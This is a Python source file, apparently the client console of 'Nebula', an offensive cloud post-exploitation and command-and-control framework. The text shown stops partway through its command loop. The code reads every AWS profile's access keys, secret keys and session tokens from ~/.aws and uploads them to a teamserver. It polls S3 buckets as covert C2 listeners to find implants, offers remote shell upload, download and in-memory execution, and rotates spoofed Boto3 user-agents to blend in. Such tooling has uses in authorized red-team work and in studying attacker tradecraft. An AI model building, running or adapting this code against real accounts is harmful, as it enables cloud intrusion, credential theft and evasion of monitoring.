# !/usr/bin/python3
import argparse
import base64
from getpass import getpass
import json
import os
import platform
import random
import re
import sys
from pydoc import pipepager
import string

import boto3
import botocore
import botocore.session
import docker
import prettytable
import requests
from colorama import init

from core.RunAndPrintModule import RunModule, PrintAWSModule, PrintModule

from prompt_toolkit import PromptSession
from prompt_toolkit.completion import NestedCompleter
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.history import FileHistory
from prompt_toolkit.shortcuts import CompleteStyle
from termcolor import colored

import banner
import commands.aws_get_user_id
from commands.get_iam_users import list_aws_iam_users, get_aws_iam_user
from commands.get_s3_buckets import list_aws_s3_buckets, get_aws_s3_bucket
from commands.aws_s3_c2_client import getsendcommand
from commands.get_domains import list_domains, get_domains
from help import help

init()

parser = argparse.ArgumentParser(description='------ Nebula Client Options ------')
parser.add_argument('-ah', '--apiHost', type=str, help='The API Server Host.', default="127.0.0.1")
parser.add_argument('-ap', '--apiPort', type=int, help='The API Server Port. (Default: 5000)', default=5000)
#parser.add_argument('-w', '--workspace', type=str, help='The Workspace to work with. (Required)', required=True)
parser.add_argument('-u', '--username', type=str, help='The username to login as (Default \'cosmonaut\').')
parser.add_argument('-p', '--password', type=str, help='The password for user \'cosmonaut\'. (Required)')
parser.add_argument("-b", action='store_true', help="Do not print banner")
parser.add_argument("-c", "--config-file", help="Config File path")
args = parser.parse_args()

if args.config_file is None:
    apihost = "http://{}:{}".format(args.apiHost, args.apiPort)
    system = platform.system()
    global username
    username = args.username

    if username == None:
        username = 'cosmonaut'

    if args.password is not None:
        password = args.password
    else:
        password = getpass("Password: ")
        while password == "":
            password = getpass("Password: ")

    jwt_token = ""
    #workspace = args.workspace
    workspace = ""
else:
    if args.password: # or args.workspace:
        print("Either use a config file or use -dn (database name) and -p (password)")
        exit()
    else:
        configFile = open(args.config_file, "r")
        configFileJson = json.load(configFile)

        apiH = configFileJson['databaseHost']
        apiP = 5000

        apihost = "http://{}:{}".format(args.apiHost, args.apiPort)

        workspace = configFileJson['databaseName']
        password = configFileJson['password']

try:
    jwt_token_dict = json.loads(requests.post("{}/api/latest/cosmonauts".format(apihost), headers={'Content-Type': 'application/json'}, json={"cosmonaut_name": username, "cosmonaut_pass":password}).text)
    if 'token' in jwt_token_dict:
        jwt_token = jwt_token_dict['token']

    else:
        print(colored("[*] {}".format(jwt_token_dict['error']), "red"))
        exit()

except requests.exceptions.ConnectionError as e:
    print(colored("[*] Failed to establish a new connection to the Teamserver API Server", "red"))
    exit()

except Exception as e:
    print(colored("[*] {}".format(sys.exc_info()[1]), "red"))
    exit()

workspaces = []
module = ''
module_char = ''
module_options = {}

show = [
    'cleanup',
    'detection',
    'detectionbypass',
    'enum',
    'exploit',
    'lateralmovement',
    'listeners',
    'persistence',
    'privesc',
    'reconnaissance',
    'stager',
    'misc',
    "postexploitation",
    "initialaccess"
]

global all_sessions
all_sessions = []
sess_test = {}
region = ""
aws_creds_body = {}

module_count_dict = json.loads(requests.get("{}/api/latest/modules/count".format(apihost), headers = {"Authorization": "Bearer {}".format(jwt_token)}).text)

if args.b:
    print(colored("-------------------------------------------------------------", "green"))
    banner.module_count_without_banner(
        module_count_dict['nr_of_cloud_modules'],
        module_count_dict['nr_of_modules'],
        module_count_dict['all_count'])
    print(colored("-------------------------------------------------------------\n", "green"))

else:
    banner.banner(
        module_count_dict['nr_of_cloud_modules'],
        module_count_dict['nr_of_modules'],
        module_count_dict['all_count']
    )


allmodules = []
modules_json = json.loads(requests.get("{}/api/latest/modules".format(apihost), headers = {"Authorization": "Bearer {}".format(jwt_token)}).text)['modules']

for m in modules_json:
    allmodules.append(m['amodule'])

user_agents_windows = [
    'Boto3/1.7.48 Python/3.9.1 Windows/10 Botocore/1.10.48',
    'Boto3/1.7.48 Python/3.8.1 Windows/10 Botocore/1.10.48',
    'Boto3/1.7.48 Python/2.7.0 Windows/10 Botocore/1.10.48',
    'Boto3/1.7.48 Python/3.9.1 Windows/8 Botocore/1.10.48',
    'Boto3/1.7.48 Python/3.8.1 Windows/8 Botocore/1.10.48',
    'Boto3/1.7.48 Python/2.7.0 Windows/8 Botocore/1.10.48',
    'Boto3/1.7.48 Python/3.9.1 Windows/7 Botocore/1.10.48',
    'Boto3/1.7.48 Python/3.8.1 Windows/7 Botocore/1.10.48',
    'Boto3/1.7.48 Python/2.7.0 Windows/7 Botocore/1.10.48'

]
user_agents_linux = [
    'Boto3/1.9.89 Python/2.7.12 Linux/4.1.2-34-generic',
    'Boto3/1.9.89 Python/3.8.1 Linux/4.1.2-34-generic',
    'Boto3/1.9.89 Python/3.9.1 Linux/5.9.0-34-generic'
]

colors = [
    "not-used",
    "red",
    "blue",
    "yellow",
    "green",
    "magenta",
    "cyan",
    "white",
    "red",
    "blue",
    "yellow",
    "green",
    "magenta",
    "cyan",
    "white"
]

output = ""

def list_dictionary(d, n_tab):
    global output
    if isinstance(d, list):
        n_tab += 1
        for i in d:
            if not isinstance(i, list) and not isinstance(i, dict):
                output += ("{}{}\n".format("\t" * n_tab, colored(i, colors[n_tab])))
            else:
                list_dictionary(i, n_tab)
    elif isinstance(d, dict):
        n_tab+=1
        for key, value in d.items():
            if not isinstance(value, dict) and not isinstance(value, list):
                output += ("{}{}: {}\n".format("\t"*n_tab, colored(key, colors[n_tab], attrs=['bold']) , colored(value, colors[n_tab+1])))
            else:
                output += ("{}{}:\n".format("\t"*n_tab, colored(key, colors[n_tab], attrs=['bold'])))
                list_dictionary(value, n_tab)

AWS_REGIONS = [
        "af-south-1",
        "ap-east-1",
        "ap-northeast-1",
        "ap-northeast-2",
        "ap-northeast-3",
        "ap-south-1",
        "ap-southeast-1",
        "ap-southeast-2",
        "ca-central-1",
        "eu-central-1",
        "eu-north-1",
        "eu-south-1",
        "eu-west-1",
        "eu-west-2",
        "eu-west-3",
        "me-south-1",
        "sa-east-1",
        "us-east-1",
        "us-east-2",
        "us-gov-east-1",
        "us-gov-west-1",
        "us-west-1",
        "us-west-2"
    ]

global web_proxies

comms = {
    "list_aws_iam_users": None,
    "list_aws_s3_buckets": None,
    "get_aws_s3_bucket": None,
    "get_aws_iam_user": None,
    "show":{
        "web-proxies": None,
        "credentials": {
            "plain-text": None
        },
        "listeners":None,
        "particles": None,
        "workspaces": None,
        "modules": None,
        "user-agent":None,
        "current-creds": None,
        "cosmonauts": None,
        "default-regions": None,
        "all-regions": None
    },
    "search":None,
    "exit":None,
    "use":{
        "credentials":{},
        "particle":{},
        "module": WordCompleter(
            words=(allmodules),
            pattern=re.compile(
                r'([a-zA-Z0-9_\\/]+|[^a-zA-Z0-9_\s]+)'
            )
        ),
    },
    "create": {
        "user": None
    },
    "getuid":{
        "ssmrole": None
    },
    "set": {
        "web-proxies": None,
        "aws-credentials": None,
        "azure-credentials": None,
        "azuread-credentials": None,
        "do-credentials": None,
        "gcp-credentials": None,
        "user-agent": {
            "linux":None,
            "windows":None,
            "custom":None
        },
        "aws-region": {
            "af-south-1":None,
            "ap-east-1":None,
            "ap-northeast-1":None,
            "ap-northeast-2":None,
            "ap-northeast-3":None,
            "ap-south-1":None,
            "ap-southeast-1":None,
            "ap-southeast-2":None,
            "ca-central-1":None,
            "eu-central-1":None,
            "eu-north-1":None,
            "eu-south-1":None,
            "eu-west-1":None,
            "eu-west-2":None,
            "eu-west-3":None,
            "me-south-1":None,
            "sa-east-1":None,
            "us-east-1":None,
            "us-east-2":None,
            "us-gov-east-1":None,
            "us-gov-west-1":None,
            "us-west-1":None,
            "us-west-2":None
        },
        "default-regions": None
    },
    "help": {
        "workspace":None,
        "user-agent":None,
        "module":None,
        "credentials": None,
        "shell":None
    },
    "options": None,
    "back": None,
    "remove":{
        "user": {},
        "credentials": {},
    },
    "run": None,
    "unset": {
        "credentials":None,
        "user-agent":None,
        "particle":None
    },
    "kill":{
        "listener":{},
        "particle":{
            "all":None
        }
    },
    "shell":{
        "check_env": None,
        "exit": None,
        "upload": None,
        "download": None,
        "run_in_memory":None
    },
    "enum_user_privs":None,
    "rename":{
        "particle":{}
    },
    "reset-password": {

    },
    "start_c2_listener": {
        "websocket": None
    }

}

aws_sessions = json.loads(requests.get("{}/api/latest/awscredentials".format(apihost),
                                       headers={"Authorization": "Bearer {}".format(jwt_token)}).text)

azure_sessions = json.loads(requests.get("{}/api/latest/azurecredentials".format(apihost),
                                       headers={"Authorization": "Bearer {}".format(jwt_token)}).text)

digitalocean_sessions = json.loads(requests.get("{}/api/latest/digitaloceancredentials".format(apihost),
                                      headers={"Authorization": "Bearer {}".format(jwt_token)}).text)

for do_sess in digitalocean_sessions:
    comms['use']['credentials'][do_sess['digitalocean_profile_name']] = None
    comms['remove']['credentials'][do_sess['digitalocean_profile_name']] = None
    if "digitalocean_token" in do_sess:
        all_sessions.append(
            {
                'provider': 'DIGITALOCEAN',
                'profile': do_sess['digitalocean_profile_name'],
                'digitalocean_token': do_sess['digitalocean_token'],
            }
        )
    else:
        if not 'digitalocean_region' in do_sess:
            do_sess['digitalocean_region'] = ""

        all_sessions.append(
            {
                'provider': 'DIGITALOCEAN',
                'profile': do_sess['digitalocean_profile_name'],
                'access_key_id': do_sess['digitalocean_access_key'],
                'secret_key': do_sess['digitalocean_secret_key'],
                'region': do_sess['digitalocean_region']
            }
        )

for aws_sess in aws_sessions:
    comms['use']['credentials'][aws_sess['aws_profile_name']] = None
    comms['remove']['credentials'][aws_sess['aws_profile_name']] = None
    if "aws_session_token" in aws_sess:
        all_sessions.append(
            {
                'provider': 'AWS',
                'profile': aws_sess['aws_profile_name'],
                'access_key_id': aws_sess['aws_access_key'],
                'secret_key': aws_sess['aws_secret_key'],
                'session_token': aws_sess['aws_session_token'],
                'region': aws_sess['aws_region']
            }
        )
    else:
        if not 'aws_region' in aws_sess:
            aws_sess['aws_region'] = ""


        all_sessions.append(
            {
                'provider': 'AWS',
                'profile': aws_sess['aws_profile_name'],
                'access_key_id': aws_sess['aws_access_key'],
                'secret_key': aws_sess['aws_secret_key'],
                'region': aws_sess['aws_region']
            }
        )

#print(all_sessions)

for az_sess in azure_sessions:
    del az_sess['_id']
    for ass in all_sessions:
        if az_sess["azure_creds_name"] == ass['profile']:
            pass
        else:
            comms['use']['credentials'][az_sess['azure_creds_name']] = None
            comms['remove']['credentials'][az_sess['azure_creds_name']] = None
            az_sess['profile'] = az_sess['azure_creds_name']
            del(az_sess['azure_creds_name'])
            az_sess['provider'] = 'AZURE'
            all_sessions.append(az_sess)
            break

user_listed = json.loads(requests.get("{}/api/latest/cosmonauts".format(apihost),
                                                              headers={
                                                                  "Authorization": "Bearer {}".format(jwt_token)}).text)

for user in user_listed['cosmonauts']:
    comms['remove']['user'][user] = None
    comms['reset-password'][user] = None

del user_listed
del user

def update_all_sessions_azure():
    azure_sessions = json.loads(requests.get("{}/api/latest/azurecredentials".format(apihost),
                                             headers={"Authorization": "Bearer {}".format(jwt_token)}).text)

    test = 1
    for az_sess in azure_sessions:
        for ass in all_sessions:
            if az_sess['azure_creds_name'] == ass['profile']:
                test = 0
                if "azure_access_token" in az_sess:
                    if az_sess['azure_access_token'] == ass['azure_access_token']:
                        pass
                    else:
                        all_sessions.remove(ass)
                        comms['use']['credentials'][az_sess['azure_creds_name']] = None
                        comms['remove']['credentials'][az_sess['azure_creds_name']] = None
                        az_sess['profile'] = az_sess['azure_creds_name']
                        del (az_sess['azure_creds_name'])
                        az_sess['provider'] = 'AZURE'

                        all_sessions.append(az_sess)
                        continue
                else:
                    all_sessions.remove(ass)
                    comms['use']['credentials'][az_sess['azure_creds_name']] = None
                    comms['remove']['credentials'][az_sess['azure_creds_name']] = None
                    az_sess['profile'] = az_sess['azure_creds_name']
                    del (az_sess['azure_creds_name'])
                    az_sess['provider'] = 'AZURE'

                    all_sessions.append(az_sess)
                    continue
        if test == 1:
            comms['use']['credentials'][az_sess['azure_creds_name']] = None
            comms['remove']['credentials'][az_sess['azure_creds_name']] = None
            az_sess['profile'] = az_sess['azure_creds_name']
            del (az_sess['azure_creds_name'])
            az_sess['provider'] = 'AZURE'

            all_sessions.append(az_sess)
            continue

def unique_sessions():
    global all_sessions
    size = len(all_sessions)
    if len(all_sessions) == 0:
        pass
    else:
        for i in range(0,size-1):
            for j in range(i+1,size):
                if (all_sessions[i])['profile'] == (all_sessions[j])['profile']:
                    #del(all_sessions[j])
                    for k in range(j, size-1):
                        all_sessions[k] = all_sessions[k+1]

                    size -= 1
                    j -= 1
    all_sessions = all_sessions[:size]

particles = []
particle_command_key = ""
particle_output_key = ""
particle = ''
def main(workspace, particle, module_char):
    """
    dbdata = {
        "particle_key_name": "",
        "particle_listener_name": bucket
    }
    
    try:
        s3c2data = S3C2Particle.objects.get(particle_listener_name=bucket)
        s3c2data.modify(**dbdata)
        s3c2data.save()

    except mongoengine.DoesNotExist:
        S3C2Particle(**dbdata).save()

    except Exception as e:
        e = sys.exc_info()
        return {"error": "Error from module: {}".format(str(e))}, 500
    """

    terminal = 'Nebula'
    curr_creds = None

    cred_prof = ""
    global username
    global web_proxies
    web_proxies = []

    HTTP_PROXY_CERT = ""

    regions = []

    try:
        print(
            colored("[*] Importing sessions found on ~/.aws","yellow")
        )
        botocoresessions = botocore.session.Session().available_profiles
        #botocoresessions = []
        if len(botocoresessions) == 0:
            print(
                colored(
                    "[*] No sessions found on ~/.aws",
                    "green")
            )
        else:
            print(
                colored("[*] Imported sessions found on ~/.aws. Enter 'show credentials' to get the credentials.", "green")
            )
            if len(all_sessions) == 0:
                for botoprofile in botocoresessions:
                    botosession = botocore.session.Session(profile=botoprofile)
                    ass = {}
                    ass['provider'] = 'AWS'
                    ass['profile'] = botoprofile
                    ass['access_key_id'] = botosession.get_credentials().access_key
                    ass['secret_key'] = botosession.get_credentials().secret_key
                    ass['region'] = botosession.get_config_variable('region')

                    aws_creds_body = {
                        "aws_profile_name": ass['profile'],
                        "aws_access_key": ass['access_key_id'],
                        "aws_secret_key": ass['secret_key'],
                        "aws_region": ass['region']
                    }

                    if not botosession.get_credentials().token == None:
                        ass['session_token'] = botosession.get_credentials().token
                        aws_creds_body['aws_session_token'] = botosession.get_credentials().token

                    all_sessions.append(ass)

                    comms['use']['credentials'][botoprofile] = None
                    comms['remove']['credentials'][botoprofile] = None

                    creds_response = requests.put("{}/api/latest/awscredentials".format(apihost),
                                                  headers={
                                                      "Authorization": "Bearer {}".format(jwt_token)
                                                  },
                                                  json=aws_creds_body)

                    set_creds = json.loads(creds_response.text)

                    if "error" in set_creds:
                        creds_status_code = set_creds['status_code']
                        if creds_status_code == 1337:
                            # if "Tried to save duplicate unique keys" in set_creds['error']:
                            pass
                        else:
                            print('a')
                            print(colored("[*] {}".format(set_creds['error']), "red"))

            else:
                for botoprofile in botocoresessions:
                    for pr in all_sessions:
                        try:
                            if pr['profile'] == botoprofile:
                                yn = input(colored("[*] Profile '{}' exists. Do you want to overwrite? [y/N] ".format(pr['profile']), "yellow"))
                                if yn == 'y' or yn == 'Y':
                                    botosession = botocore.session.Session(profile=botoprofile)
                                    ass = {}
                                    ass['provider'] = 'AWS'
                                    ass['profile'] = botoprofile
                                    ass['access_key_id'] = botosession.get_credentials().access_key
                                    ass['secret_key'] = botosession.get_credentials().secret_key
                                    ass['region'] = "Not-Assigned"
                                    ass['region'] = botosession.get_config_variable('region')

                                    aws_creds_body = {
                                        "aws_profile_name": ass['profile'],
                                        "aws_access_key": ass['access_key_id'],
                                        "aws_secret_key": ass['secret_key'],
                                        "aws_region": ass['region']
                                    }

                                    if not botosession.get_credentials().token == None:
                                        ass['session_token'] = botosession.get_credentials().token
                                        aws_creds_body['aws_session_token'] = ass['session_token']

                                    all_sessions.append(ass)
                                    comms['use']['credentials'][botoprofile] = None
                                    comms['remove']['credentials'][botoprofile] = None

                                    creds_response = requests.put("{}/api/latest/awscredentials".format(apihost),
                                                                        headers={
                                                                            "Authorization": "Bearer {}".format(jwt_token)
                                                                        },
                                                                        json=aws_creds_body)

                                    set_creds = json.loads(creds_response.text)

                                    if "error" in set_creds:
                                        creds_status_code = set_creds['status_code']
                                        if creds_status_code == 1337:
                                            #if "Tried to save duplicate unique keys" in set_creds['error']:
                                            pass
                                        else:
                                            print('a')
                                            print(colored("[*] {}".format(set_creds['error']), "red"))

                                    break

                            else:
                                botosession = botocore.session.Session(profile=botoprofile)
                                ass = {}
                                ass['provider'] = 'AWS'
                                ass['profile'] = botoprofile
                                ass['access_key_id'] = botosession.get_credentials().access_key
                                ass['secret_key'] = botosession.get_credentials().secret_key
                                ass['region'] = botosession.get_config_variable('region')

                                aws_creds_body = {
                                    "aws_profile_name": ass['profile'],
                                    "aws_access_key": ass['access_key_id'],
                                    "aws_secret_key": ass['secret_key'],
                                    "aws_region": ass['region']
                                }

                                if not botosession.get_credentials().token == None:
                                    ass['session_token'] = botosession.get_credentials().token
                                    aws_creds_body['aws_session_token'] = ass['session_token']

                                all_sessions.append(ass)
                                comms['use']['credentials'][botoprofile] = None
                                comms['remove']['credentials'][botoprofile] = None
                                creds_response = requests.put("{}/api/latest/awscredentials".format(apihost),
                                                              headers={
                                                                  "Authorization": "Bearer {}".format(jwt_token)
                                                              },
                                                              json=aws_creds_body)

                                set_creds = json.loads(creds_response.text)

                                if "error" in set_creds:
                                    if set_creds['status_code'] == 1337:
                                        # if "Tried to save duplicate unique keys" in set_creds['error']:
                                        pass
                                    else:
                                        print(colored("[*] {}".format(set_creds['error']), "red"))

                                break
                        except botocore.exceptions.InvalidConfigError:
                            print(colored(f"[*] {str(e)}", 'red'))

                        except Exception as e:
                            print(colored(f"[*] {str(e)}", 'red'))


        completer = NestedCompleter.from_nested_dict(comms)

        #com = "({})({})({}) >>> ".format(colored(workspace, "green"), colored(particle, "red"), colored(terminal, "blue"))
        com = "({})({})({}) >>> ".format("", colored(particle, "red"),
                                         colored(terminal, "blue"))

        history_file = FileHistory(".nebula-history-file")
        session = PromptSession(history=history_file)
        command = session.prompt(
            ANSI(com),
            completer=completer,
            complete_style=CompleteStyle.READLINE_LIKE
        )
        command.strip()

        while True:
            update_all_sessions_azure()
            if curr_creds is None:
                cur_creds_name = ""
            else:
                cur_creds_name = curr_creds['profile']
            useragent = ""


            listeners = requests.get("{}/api/latest/listeners".format(apihost),
                                     headers={
                                         "Authorization": "Bearer {}".format(jwt_token)
                                     }
                                     ).json()["Listeners"]

            if listeners is not None:
                for listener in listeners:
                    del listener['_id']

                    listenerargs = {
                        "service_name": "s3",
                        "region_name": listener['listener_region'],
                        "aws_access_key_id": listener['listener_access_key'],
                        "aws_secret_access_key": listener['listener_secret_key']
                    }

                    s3profile = boto3.client(
                        **listenerargs
                    )
                    statuscode = requests.get(f"https://{listener['listener_bucket_name']}.s3.amazonaws.com").status_code
                    if statuscode == 200 or statuscode == 403:
                        try:
                            response = s3profile.list_objects_v2(
                                Bucket=listener['listener_bucket_name'],
                                #SSECustomerKey=listener['listener_kms_key_arn']
                            )

                            if "Contents" in response:
                                listenerobjects = response["Contents"]
                                while response["IsTruncated"]:
                                    listenerobjects.extend(response["Contents"])

                                for lkey in listenerobjects:
                                    if lkey['Key'][-1] == "/":
                                        parcheck = 0
                                        for particletemp in particles:
                                            if lkey['Key'][:-1] == particletemp['particle_key_name']:
                                                parcheck = 1
                                        if parcheck == 0:
                                            particles.append({
                                                "particle_key_name": lkey['Key'][:-1],
                                                "particle_listener_name": listener['listener_bucket_name']
                                            })
                                            comms['use']['particle'][lkey['Key'][:-1]] = None
                        except Exception as e:
                            print(
                                colored(
                                    "[*] The bucket does not exist. Deleting listener", "red"
                                )
                            )
                            dellistener = requests.delete("{}/api/latest/listeners".format(apihost),
                                                     headers={
                                                         "Authorization": "Bearer {}".format(jwt_token)
                                                     },
                                                     json={"listener_bucket_name": listener['listener_bucket_name']}
                                                     )

                            if not dellistener.status_code == 200:
                                print(dellistener.json()['error'])
                    else:
                        print(
                            colored(
                                "[*] The bucket does not exist. Deleting listener", "red"
                            )
                        )
                        dellistener = requests.delete("{}/api/latest/listeners".format(apihost),
                                                      headers={
                                                          "Authorization": "Bearer {}".format(jwt_token)
                                                      },
                                                      json={"listener_bucket_name": listener['listener_bucket_name']}
                                                      )
                        for listenerobj in listeners:
                            if listenerobj['listener_bucket_name'] == listener['listener_bucket_name']:
                                del listeners[listeners.index(listenerobj)]

                        if not dellistener.status_code == 200:
                            print(dellistener.json()['error'])

            n_tab = 0
            global output

            update_all_sessions_azure()

            unique_sessions()

            if command == 'help':
                help.help()

            elif len(command.split(" ")) > 1 and command.split(" ")[0] == 'search':
                searchstring = command.split(" ")[1]
                column_width, row_width = os.get_terminal_size(0)
                #table.max_width = column_width
                table = prettytable.PrettyTable(max_table_width=column_width)
                table.field_names = [colored('Modules', "green"), colored('Description', "green")]

                rowcheck = 0
                for m in modules_json:
                    if searchstring in m['amodule']:
                        if rowcheck == 0:
                            rowcheck = 1
                            color = "blue"
                        elif rowcheck == 1:
                            rowcheck = 0
                            color = "yellow"
                        table.add_row([
                            colored(m['amodule'], color),
                            colored(m['description'], color)
                        ])
                        table.add_row([
                            "",
                            ""
                        ])

                table.max_width = int(os.get_terminal_size().columns - 60)
                table.align = 'l'
                table.set_style(prettytable.DOUBLE_BORDER)
                print(table)
            elif len(command.split(" ")) > 1 and command.split(" ")[0] == 'help':
                help_comm = command.split(" ")[1]
                help.specific_help(help_comm)

            elif command.split(" ")[0] == 'get_user_id':
                if cred_prof == "":
                    print(colored("[*] Select a set of credentials first.", "red"))
                else:
                    for profile in all_sessions:
                        if profile['profile'] == cred_prof:
                            print(json.dumps(commands.aws_get_user_id.get_user_id(
                                apihost, jwt_token, profile, useragent
                            ), indent=4, default=str))
                            break

            elif command.split(" ")[0] == 'getuid':
                if cred_prof == "":
                    print(colored("[*] Select a set of credentials first.", "red"))
                else:
                    if curr_creds['provider'] == "AZURE":
                        getuid_response = json.loads(
                            requests.post("{}/api/latest/azurecredentials/getuid".format(apihost),
                                          headers={
                                              "Authorization": "Bearer {}".format(jwt_token)
                                          },
                                          json={
                                              "curr_creds": curr_creds,
                                          }).text)
                        from pygments import highlight
                        from pygments.lexers import JsonLexer
                        from pygments.formatters import TerminalFormatter

                        for title_name, json_data in getuid_response.items():
                            if isinstance(json_data, list):
                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow", attrs=['bold'])
                                for data in json_data:
                                    output += colored(
                                        "{}: {}\n".format(title_name, data[title_name]),
                                        "yellow", attrs=['bold'])
                                    output += colored(
                                        "------------------------------------------------------------------\n",
                                        "yellow", attrs=['bold'])
                                    raw_json = json.dumps(data, indent=4)
                                    output += highlight(
                                        raw_json,
                                        JsonLexer(),
                                        TerminalFormatter()
                                    )

                                    # Print to console

                                    output += colored(
                                        "------------------------------------------------------------------\n",
                                        "yellow",
                                        attrs=['bold'])
                            else:
                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow", attrs=['bold'])
                                output += colored(
                                    "{}: {}\n".format(title_name, json_data[title_name]),
                                    "yellow", attrs=['bold'])
                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow", attrs=['bold'])
                                raw_json = json.dumps(json_data, indent=4)
                                output += highlight(
                                    raw_json,
                                    JsonLexer(),
                                    TerminalFormatter()

                                )
                                # TerminalFormatter()
                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow", attrs=['bold'])
                        print(output)
                        output = ""

                    elif curr_creds['provider'] == "AWS":
                        if len(command.split(" ")) > 1 and command.split(" ")[1] == 'ssmrole':
                            getuid_response = json.loads(requests.post("{}/api/latest/awscredentials/getuid/ssmrole".format(apihost),
                                                          headers={
                                                              "Authorization": "Bearer {}".format(jwt_token)
                                                          },
                                                          json={
                                                              "aws_all_sessions": all_sessions,
                                                              "aws_profile_name": cred_prof,
                                                              "workspace": workspace,
                                                              "user-agent": useragent,
                                                              "web_proxies": web_proxies
                                                          }).text)

                            from pygments import highlight
                            from pygments.lexers import JsonLexer
                            from pygments.formatters import TerminalFormatter

                            for title_name, json_data in getuid_response.items():
                                if isinstance(json_data, list):
                                    output += colored(
                                        "------------------------------------------------------------------\n",
                                        "yellow", attrs=['bold'])
                                    for data in json_data:
                                        output += colored(
                                            "{}: {}\n".format(title_name, data[title_name]),
                                            "yellow", attrs=['bold'])
                                        output += colored(
                                            "------------------------------------------------------------------\n",
                                            "yellow", attrs=['bold'])
                                        raw_json = json.dumps(data, indent=4)
                                        output += highlight(
                                            raw_json,
                                            JsonLexer(),
                                            TerminalFormatter()
                                        )

                                        # Print to console

                                        output += colored(
                                            "------------------------------------------------------------------\n",
                                            "yellow",
                                            attrs=['bold'])
                                else:
                                    output += colored(
                                        "------------------------------------------------------------------\n",
                                        "yellow", attrs=['bold'])
                                    output += colored(
                                        "{}: {}\n".format(title_name, json_data[title_name]),
                                        "yellow", attrs=['bold'])
                                    output += colored(
                                        "------------------------------------------------------------------\n",
                                        "yellow", attrs=['bold'])
                                    raw_json = json.dumps(json_data, indent=4)
                                    output += highlight(
                                        raw_json,
                                        JsonLexer(),
                                        TerminalFormatter()

                                    )
                                    # TerminalFormatter()
                                    output += colored(
                                        "------------------------------------------------------------------\n",
                                        "yellow", attrs=['bold'])
                            print(output)
                            output = ""
                        else:
                            getuid_response = json.loads(requests.post("{}/api/latest/awscredentials/getuid".format(apihost),
                                                          headers={
                                                              "Authorization": "Bearer {}".format(jwt_token)
                                                          },
                                                          json={
                                                              "aws_profile_name": cred_prof,
                                                              "workspace": workspace
                                                          }).text)
                            from pygments import highlight
                            from pygments.lexers import JsonLexer
                            from pygments.formatters import TerminalFormatter

                            for title_name, json_data in getuid_response.items():
                                if isinstance(json_data, list):
                                    output += colored("------------------------------------------------------------------\n",
                                                      "yellow", attrs=['bold'])
                                    for data in json_data:
                                        output += colored(
                                            "{}: {}\n".format(title_name, data[title_name]),
                                            "yellow", attrs=['bold'])
                                        output += colored(
                                            "------------------------------------------------------------------\n",
                                            "yellow", attrs=['bold'])
                                        raw_json = json.dumps(data, indent=4)
                                        output += highlight(
                                            raw_json,
                                            JsonLexer(),
                                            TerminalFormatter()
                                        )

                                        # Print to console

                                        output += colored(
                                            "------------------------------------------------------------------\n",
                                            "yellow",
                                            attrs=['bold'])
                                else:
                                    output += colored("------------------------------------------------------------------\n",
                                                      "yellow", attrs=['bold'])
                                    output += colored(
                                        "{}: {}\n".format(title_name, json_data[title_name]),
                                        "yellow", attrs=['bold'])
                                    output += colored("------------------------------------------------------------------\n",
                                                      "yellow", attrs=['bold'])
                                    raw_json = json.dumps(json_data, indent=4)
                                    output += highlight(
                                        raw_json,
                                        JsonLexer(),
                                        TerminalFormatter()

                                    )
                                    # TerminalFormatter()
                                    output += colored("------------------------------------------------------------------\n",
                                                      "yellow", attrs=['bold'])
                                #pipepager(output, cmd='less -FR')
                                print(output)
                                output = ""

                    """
                    for title_name, json_data in getuid_response.items():
                        if isinstance(json_data, list):
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                            for data in json_data:
                                output += colored(
                                    "{}: {}\n".format(title_name, data[title_name]),
                                    "yellow", attrs=['bold'])
                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow", attrs=['bold'])
                                list_dictionary(data, n_tab)
                                output += colored(
                                    "------------------------------------------------------------------\n",
                                    "yellow",
                                    attrs=['bold'])
                        else:
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                            output += colored(
                                "{}: {}\n".format(title_name, json_data[title_name]),
                                "yellow", attrs=['bold'])
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                            list_dictionary(json_data, n_tab)
                            output += colored("------------------------------------------------------------------\n",
                                              "yellow", attrs=['bold'])
                        pipepager(output, cmd='less -FR')
                        output = ""
                    """


            elif command.split(" ")[0] == 'banner':
                banner.banner(
                    module_count_dict['nr_of_cloud_modules'],
                    module_count_dict['nr_of_modules'],
                    module_count_dict['all_count']
                )

            elif command.split(" ")[0] == 'show':
                if command.split(" ")[1] == 'all-regions':
                    from pygments import highlight, lexers, formatters
                    colorful_json = highlight(json.dumps(AWS_REGIONS, indent=4, default=str), lexers.JsonLexer(),
                                              formatters.TerminalFormatter())
                    print(colorful_json)

                elif command.split(" ")[1] == 'default-regions':
                    from pygments import highlight, lexers, formatters
                    colorful_json = highlight(json.dumps(regions, indent=4, default=str), lexers.JsonLexer(),
                                              formatters.TerminalFormatter())
                    print(colorful_json)

                elif command.split(" ")[1] == 'particles':
                    column_width, row_width = os.get_terminal_size(0)
                    # table.max_width = column_width
                    table = prettytable.PrettyTable(max_table_width=column_width)
                    table.field_names = [
                        colored("Particle Name", "green"),
                        colored("Bucket Name", "green")
                    ]

                    for particlelist in particles:
                        row = [
                            particlelist['particle_key_name'],
                            particlelist['particle_listener_name'],
                        ]

                        table.add_row(row)

                    table.max_width = int(os.get_terminal_size().columns - 60)
                    table.align = 'l'
                    table.set_style(prettytable.DOUBLE_BORDER)
                    print(table)
                    del table

                elif command.split(" ")[1] == 'listeners':
                    if listeners is not None:
                        column_width, row_width = os.get_terminal_size(0)
                        # table.max_width = column_width
                        table = prettytable.PrettyTable(max_table_width=column_width)
                        table.field_names = [
                            colored("Bucket Name", "green"),
                            colored("Command File", "green"),
                            colored("Output File", "green"),
                            colored("KMS Key", "green"),

                        ]

                        for listener in listeners:
                            row = [
                                listener['listener_bucket_name'],
                                listener['listener_command_file'],
                                listener['listener_output_file'],
                                listener['listener_kms_key_arn']
                            ]

                            table.add_row(row)

                        table.max_width = int(os.get_terminal_size().columns - 60)
                        table.align = 'l'
                        table.set_style(prettytable.DOUBLE_BORDER)
                        print(table)
                    else:
                        print(
                            colored(
                                "[*] No listeners configured", "red"
                            )
                        )
                elif command.split(" ")[1] == 'web-proxies':
